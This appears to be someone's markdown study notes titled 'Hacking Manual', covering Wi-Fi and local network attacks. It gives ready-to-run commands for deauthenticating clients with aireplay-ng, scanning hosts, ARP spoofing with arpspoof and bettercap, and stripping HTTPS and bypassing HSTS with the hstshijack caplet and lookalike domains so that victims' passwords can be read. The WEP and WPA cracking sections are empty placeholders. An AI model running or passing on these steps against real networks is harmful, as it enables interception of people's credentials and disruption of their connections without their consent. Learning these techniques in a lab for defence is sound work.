# Hacking Manual

## Wireless Attacks

## Preconnection Attack

This section describes the attacks possible before connecting to the network. We cannot do much if the network is encrypted using any security protocol but certainly we can disconnect devices on the network in most of the cases. Also, if the connection is open, we can check the packet contents (unencrypted) on Wireshark.

### Change the MAC Address

`sudo ifconfig wlan1 hw ether <changed-mac>`

### Going into monitor mode
`sudo ifconfig wlan1 down`<br />
`sudo iwconfig wlan1 mode monitor`<br />
`sudo ifconfig wlan1 up`

In case there errors, try killing all wireless services like network manager by<br />
`sudo airmon-ng check kill`

### Listening to all the wireless packets

`sudo airodump-ng wlan1`

#### Listening to all the packets on a particular network

`sudo airodump-ng --bssid <mac-address-gateway> --channel <channel-no> wlan1`

We also use --write <file-name> option to collect the packets. In particular, the cap file is very important.

### Disconnecting a client from the network

`sudo aireplay-ng --deauth <no-of-deauth-packets> -a <mac-address-gateway> -c <mac-address-client> wlan1`

## Gaining Access

This section describes what all we can do to gain access to a network.

### Cracking WEP

<missing>

### Cracking WPA/WPA2

The main differencd between WPA and WPA2 is the encryption algorithm. <br />
Before trying to crack this, it would be a great idea to check whether WPS is enabled.

#### Gain access with WPS

WPS is used by routers to connect to printers and other devices. Generally, authentication takes place using an 8 bit pin which is pretty easy to crack using brute-force. If WPS is enabled with a PUSH button, the following method won't work.

<missing>

#### Gain access without WPS or WPS with Push button

<missing>

## Post-Connection Attacks

### Discover the devices connected to the same network

#### Using netdiscover

`sudo netdiscover -r 192.168.1.1/24`<br />
This will give us all the clients connected to the same network.

#### Using nmap

This is a very great tool. This will give us a whole lot of information. <br />
We use zenmap, that is the GUI tool for nmap.

We put the target network as 192.168.1.1/24, all the possible IPs on the local subnet.
We have different scan options:
1. Ping Scan - It gives us all the devices on the network, theirs IPs and vendors (if possible).
2. Quick Scan - It also gives us the all the open ports on the client and services running on these ports (http, ssh, etc).
3. Quick Scan Plus - It gies us even more information. We'll be able to see the OS, the device type (mobile, laptop, etc) and discover the program running on the open port.

### Man In The Middle (MITM) Attack

#### ARP Spoofing

All the information from Client to Server and vice-versa will be visible to the MITM. This is possible only because ARP is not so secure.
Essentially, what we'll do is:
1. Make the router think that I am the client (Router's ARP Table will update itself).
2. Make the client (victim) think that I am the router (Client's ARP Table will update itself).

So, basically MITM will send an ARP Response saying that it is so-and-so in the network. And all the machines except the responses without even a request. Plus, they don't even verify whether we are the same IP (We are not and we believe us).

For client:<br />
`sudo arpspoof -i wlan0 -t 192.168.1.15 192.168.1.1`

For the router or gateway:<br />
sudo arpspoof -i wlan0 -t 192.168.1.1 192.168.1.15`

#### Using bettercap

bettercap is a more powerful utility.<br />
`sudo bettercap -iface wlan0`

With this command, we enter the bettercap shell.<br/>
Type `help` to get more information on modules.<br />
You will see only events.stream module running which essentially manages all the modules.

To get more information on modules, type `help <module>`.


##### net.probe and net.recon

`net.probe on` - This will turn on both the modules.<br />
Now, `net.show` will show a lot of data about devices on the network.

##### ARP Spoofing using bettercap

Check the help with `help arp.spoof`.<br />
To become the MITM:
1. `set arp.spoof.fullduplex true
2. `set arp.spoof.targets 192.168.1.15`
3. `arp.spoof on`

##### Capture all the data flowing on the target computer after ARP spoofing

`net.spoof on`
Now, we can see all the packets on the network.

##### Make a caplet file to execute all the above commands

Check out the folder with the spoof.cap file containing all the above commands and type:<br />
`sudo bettercap -iface wlan0 -caplet spoof.cap`

##### Bypass HTTPS

All the information like passwords are readable due to `http` protocol. So people came up with a solution `https` which provides SSL or TLS encryption to the data.
So, being a MITM, we downgrade `https` to `http` for the client (victim). And now, we can read the plaintext data of `http`. To do this, we'll have to use a tool call **SSL Strip**. We for now, we'll use a bettercap caplet. The already-existing caplet does not replace all `https` links with `http`. So we use a custom one - hstshijack.

Add `set net.spoof.local true` to the spoof.cap file. We are setting it because once we use the custom caplet, bettercap will think it's my password (and not show it on the screen) but it's not. By setting it, we can see all the data.

To check all the default caplets, type `caplets.show` in the bettercap shell. Now, use `hstshijack/hstshijack` in the same shell.

Now, use can check all the `https` data also. But note that if the victim computer already has the `https` website cached, then it won't work. Also, it won't work against very popular websites like facebook, twitter, etc. It does not work because they are using `HSTS`, which is much more tricky to bypass.

##### Bypass HSTS

Modern browsers are hard-coded to only load a list of `HSTS` websites over `https`.<br />
Solution: Replace all the links for HSTS with similar links to trick your browser.<br />
For example:<br />
facebook.com  -->  facebook.corn<br />
twitter.com   -->  twiter.com<br />
Note that this only works with the custom caplet file.

So how does it work?<br />
Check the code at hstshijack/hstshijack.cap.
There are the HSTS target networks we see and their replacements as above example. We can edit this as we want.
So, if someone types `google.co.in` (`http`) and then types facebook, then all the facebook.com links are replaced by facebook.corn links which are not identified as links for HSTS but render you the same page. Please note that this method only works if the person goes through a search engine, where the script can replace the links. If he/she types on the url directly, the browser knows that it has to load the `https` website for it.
